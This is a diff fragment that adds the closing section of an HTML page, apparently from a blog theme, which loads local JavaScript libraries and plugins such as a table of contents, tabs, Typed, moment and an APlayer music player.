+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+	<div id="aplayer"></div>
+
+<script src="/js/build/libs/APlayer.min.js"></script>
+
+
+<script src="/js/build/plugins/aplayer.js"></script>
+
+
+	
+</body>
+
+</html>
